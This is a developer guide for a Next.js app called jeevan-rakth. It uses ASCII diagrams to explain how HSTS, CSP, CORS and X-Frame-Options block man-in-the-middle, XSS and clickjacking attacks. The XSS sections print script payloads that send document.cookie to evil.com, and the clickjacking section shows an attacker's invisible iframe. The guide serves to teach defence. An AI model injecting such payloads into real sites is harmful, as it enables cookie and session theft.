# Security Headers Visual Flow Guide

## 🔒 How Security Headers Protect Your App

### 1. HSTS (HTTP Strict Transport Security) Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     WITHOUT HSTS                                │
└─────────────────────────────────────────────────────────────────┘

User types: http://jeevan-rakth.com
    │
    ├─► First request over HTTP (INSECURE) ❌
    │
    ├─► Attacker intercepts (Man-in-the-middle)
    │
    └─► User credentials stolen


┌─────────────────────────────────────────────────────────────────┐
│                      WITH HSTS                                  │
└─────────────────────────────────────────────────────────────────┘

User types: http://jeevan-rakth.com
    │
    ├─► Browser checks HSTS cache
    │
    ├─► Automatically upgrades to HTTPS ✅
    │
    ├─► Encrypted from the start
    │
    └─► Attacker cannot intercept
```

---

### 2. CSP (Content Security Policy) Attack Prevention

```
┌─────────────────────────────────────────────────────────────────┐
│                  XSS ATTACK WITHOUT CSP                         │
└─────────────────────────────────────────────────────────────────┘

Attacker injects:
┌──────────────────────────────────────────────┐
│ <script>                                     │
│   fetch('https://evil.com/steal?data=' +    │
│         document.cookie);                    │
│ </script>                                    │
└──────────────────────────────────────────────┘
    │
    ├─► Browser executes script ❌
    │
    ├─► Sends data to evil.com
    │
    └─► User data stolen


┌─────────────────────────────────────────────────────────────────┐
│                   XSS ATTACK WITH CSP                           │
└─────────────────────────────────────────────────────────────────┘

Attacker injects same script
    │
    ├─► Browser checks CSP policy
    │
    ├─► CSP: connect-src 'self'
    │
    ├─► evil.com NOT in allowed list
    │
    ├─► Browser BLOCKS request ✅
    │
    └─► Console error: "Violates CSP directive"
```

---

### 3. CORS (Cross-Origin Resource Sharing) Flow

```
┌─────────────────────────────────────────────────────────────────┐
│              CORS PREFLIGHT REQUEST FLOW                        │
└─────────────────────────────────────────────────────────────────┘

Frontend: https://jeevan-rakth.com
API: https://api.jeevan-rakth.com

Step 1: Preflight (OPTIONS) Request
┌──────────────────────────────────────────────┐
│ OPTIONS /api/users                           │
│ Origin: https://jeevan-rakth.com            │
│ Access-Control-Request-Method: POST          │
│ Access-Control-Request-Headers: Content-Type │
└──────────────────────────────────────────────┘
    │
    ├─► Server checks allowedOrigins []
    │
    ├─► Origin is allowed? ✅
    │
    ├─► Response:
    │   ┌────────────────────────────────────────────┐
    │   │ Access-Control-Allow-Origin: https://...   │
    │   │ Access-Control-Allow-Methods: POST, GET    │
    │   │ Access-Control-Allow-Headers: Content-Type │
    │   │ Access-Control-Max-Age: 86400              │
    │   └────────────────────────────────────────────┘
    │
    └─► Browser caches for 24 hours


Step 2: Actual Request
┌──────────────────────────────────────────────┐
│ POST /api/users                              │
│ Origin: https://jeevan-rakth.com            │
│ Content-Type: application/json               │
│ Body: { "name": "John" }                     │
└──────────────────────────────────────────────┘
    │
    ├─► Server processes request
    │
    ├─► Adds CORS headers to response
    │
    └─► Browser allows JavaScript to read response ✅


┌─────────────────────────────────────────────────────────────────┐
│                 CORS BLOCKING FLOW                              │
└─────────────────────────────────────────────────────────────────┘

Malicious Site: https://evil.com
API: https://api.jeevan-rakth.com

Request from evil.com:
┌──────────────────────────────────────────────┐
│ GET /api/users                               │
│ Origin: https://evil.com                     │
└──────────────────────────────────────────────┘
    │
    ├─► Server checks allowedOrigins []
    │
    ├─► evil.com NOT in list ❌
    │
    ├─► No CORS headers in response
    │
    ├─► Browser blocks JavaScript access
    │
    └─► Console error: "CORS policy blocked"
```

---

### 4. Request/Response Flow with All Security Headers

```
┌─────────────────────────────────────────────────────────────────┐
│            COMPLETE SECURITY HEADERS FLOW                       │
└─────────────────────────────────────────────────────────────────┘

Browser Request:
┌──────────────────────────────────────────────┐
│ GET https://jeevan-rakth.com/                │
│ Origin: https://jeevan-rakth.com            │
└──────────────────────────────────────────────┘
    │
    ├─► Next.js Middleware (src/middleware.ts)
    │   │
    │   ├─► 1. Check for OPTIONS (preflight)
    │   ├─► 2. Verify JWT token (if protected route)
    │   ├─► 3. Apply CORS headers
    │   └─► 4. Forward to route handler
    │
    ├─► Next.js Config (next.config.js)
    │   │
    │   ├─► Applies global headers:
    │   │   ├─ HSTS
    │   │   ├─ CSP
    │   │   ├─ X-Frame-Options
    │   │   ├─ X-Content-Type-Options
    │   │   ├─ Referrer-Policy
    │   │   └─ Permissions-Policy
    │   │
    │   └─► Response ready
    │
    └─► Server Response:

┌────────────────────────────────────────────────────────────────┐
│ Status: 200 OK                                                 │
│                                                                │
│ Security Headers:                                              │
│ ├─ Strict-Transport-Security: max-age=63072000; ...          │
│ ├─ Content-Security-Policy: default-src 'self'; ...          │
│ ├─ X-Frame-Options: SAMEORIGIN                               │
│ ├─ X-Content-Type-Options: nosniff                           │
│ ├─ Referrer-Policy: strict-origin-when-cross-origin          │
│ ├─ Permissions-Policy: camera=(), microphone=(), ...         │
│ └─ Access-Control-Allow-Origin: https://jeevan-rakth.com     │
│                                                                │
│ Body: [HTML content]                                           │
└────────────────────────────────────────────────────────────────┘
    │
    ├─► Browser receives response
    │
    ├─► Enforces all security policies
    │   ├─► HSTS: Only HTTPS for 2 years
    │   ├─► CSP: Only allowed scripts/styles/images
    │   ├─► X-Frame-Options: No iframe embedding
    │   └─► CORS: Only allowed origins can access API
    │
    └─► Renders page safely ✅
```

---

## 🎯 Attack Scenarios and Protections

### Scenario 1: XSS Attack Attempt

```
┌─────────────────────────────────────────────────────────────────┐
│ Attack: Malicious script injection via comment form            │
└─────────────────────────────────────────────────────────────────┘

User submits comment:
"Great article! <script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    │
    ├─► Layer 1: Input Sanitization (lib/sanitize.ts)
    │   ├─► DOMPurify removes <script> tags ✅
    │   └─► Clean output: "Great article!"
    │
    ├─► Layer 2: CSP (if script somehow gets through)
    │   ├─► Browser checks script against CSP
    │   ├─► evil.com not in connect-src
    │   └─► Browser blocks fetch() ✅
    │
    └─► Attack FAILED ✅
```

### Scenario 2: Clickjacking Attack Attempt

```
┌─────────────────────────────────────────────────────────────────┐
│ Attack: Embedding site in invisible iframe                     │
└─────────────────────────────────────────────────────────────────┘

Attacker's page (evil.com):
┌──────────────────────────────────────────────┐
│ <iframe src="https://jeevan-rakth.com"      │
│         style="opacity: 0; position: absolute"> │
│ </iframe>                                    │
│ <button>Click for prize!</button>            │
│ (Button positioned over your "Delete Account")│
└──────────────────────────────────────────────┘
    │
    ├─► Browser loads iframe
    │
    ├─► Server sends X-Frame-Options: SAMEORIGIN
    │
    ├─► Browser checks if evil.com === jeevan-rakth.com
    │
    ├─► Origins don't match
    │
    ├─► Browser REFUSES to load iframe ✅
    │
    └─► Attack FAILED ✅
```

### Scenario 3: Man-in-the-Middle Attack

```
┌─────────────────────────────────────────────────────────────────┐
│ Attack: Intercepting traffic on public WiFi                    │
└─────────────────────────────────────────────────────────────────┘

User on public WiFi tries to access site
    │
    ├─► Attacker intercepts HTTP request
    │
    ├─► Browser has HSTS cached from previous visit
    │
    ├─► Browser automatically upgrades to HTTPS
    │
    ├─► All traffic encrypted
    │
    ├─► Attacker cannot read/modify traffic ✅
    │
    └─► Attack FAILED ✅
```

---

## 📊 Security Layers Visualization

```
┌─────────────────────────────────────────────────────────────────┐
│                   DEFENSE IN DEPTH                              │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│          External Attacks                   │ ← HSTS (HTTPS enforcement)
│  ┌───────────────────────────────────────┐ │
│  │     Network Layer                     │ │ ← TLS/SSL
│  │  ┌─────────────────────────────────┐ │ │
│  │  │  Application Layer              │ │ │ ← CORS, CSP
│  │  │  ┌───────────────────────────┐  │ │ │
│  │  │  │  Input Layer              │  │ │ │ ← Input Sanitization
│  │  │  │  ┌─────────────────────┐  │  │ │ │
│  │  │  │  │  Business Logic     │  │  │ │ │ ← JWT, RBAC
│  │  │  │  │  ┌───────────────┐  │  │  │ │ │
│  │  │  │  │  │   Database    │  │  │  │ │ │ ← Prepared Statements
│  │  │  │  │  └───────────────┘  │  │  │ │ │
│  │  │  │  └─────────────────────┘  │  │ │ │
│  │  │  └───────────────────────────┘  │ │ │
│  │  └─────────────────────────────────┘ │ │
│  └───────────────────────────────────────┘ │
└─────────────────────────────────────────────┘

Each layer provides independent protection.
Attack must breach ALL layers to succeed.
```

---

## 🔧 Configuration Files Overview

```
Project Structure:

jeevan-rakth/
├── next.config.js                    ← Global security headers (HSTS, CSP)
├── src/
│   ├── middleware.ts                 ← CORS, JWT verification
│   └── lib/
│       ├── securityHeaders.ts        ← Security config (CORS, CSP)
│       ├── corsMiddleware.ts         ← CORS utilities
│       ├── sanitize.ts               ← Input sanitization
│       └── jwt.ts                    ← Token verification
└── SECURITY_HEADERS.md               ← Full documentation

Flow:
1. Request arrives → next.config.js applies global headers
2. → middleware.ts checks auth, applies CORS
3. → Route handler sanitizes input
4. → Response returns with all security headers
```

---

## 🧪 Testing Visualization

```
┌─────────────────────────────────────────────────────────────────┐
│                   TESTING WORKFLOW                              │
└─────────────────────────────────────────────────────────────────┘

Local Development:
┌────────────────────────────────────┐
│ npm run dev                        │
│   ↓                                │
│ http://localhost:3000              │
│   ↓                                │
│ DevTools → Network → Headers       │
│   ↓                                │
│ ✅ Verify all headers present      │
└────────────────────────────────────┘

Automated Testing:
┌────────────────────────────────────┐
│ node scripts/test-security-headers.js │
│   ↓                                │
│ Checks all required headers        │
│   ↓                                │
│ Reports score & issues             │
│   ↓                                │
│ ✅ Grade: A+                       │
└────────────────────────────────────┘

Production Scanning:
┌────────────────────────────────────┐
│ Deploy to production               │
│   ↓                                │
│ https://securityheaders.com        │
│   ↓                                │
│ Scan deployed URL                  │
│   ↓                                │
│ ✅ A+ Rating                       │
└────────────────────────────────────┘
```

---

## 📝 Summary Checklist

### Implementation ✅
- [x] HSTS configured in next.config.js
- [x] CSP configured with safe defaults
- [x] CORS configured with origin validation
- [x] Middleware enhanced with security
- [x] Utility functions created
- [x] Documentation written

### Testing 🧪
- [ ] Run `node scripts/test-security-headers.js`
- [ ] Check DevTools for all headers
- [ ] Test CORS with different origins
- [ ] Scan with securityheaders.com
- [ ] Verify third-party integrations work

### Production 🚀
- [ ] Update CORS allowedOrigins
- [ ] Test HTTPS is working
- [ ] Remove development origins
- [ ] Enable HSTS preload (after testing)
- [ ] Monitor for CSP violations

---

*For detailed explanations, see [SECURITY_HEADERS.md](./SECURITY_HEADERS.md)*
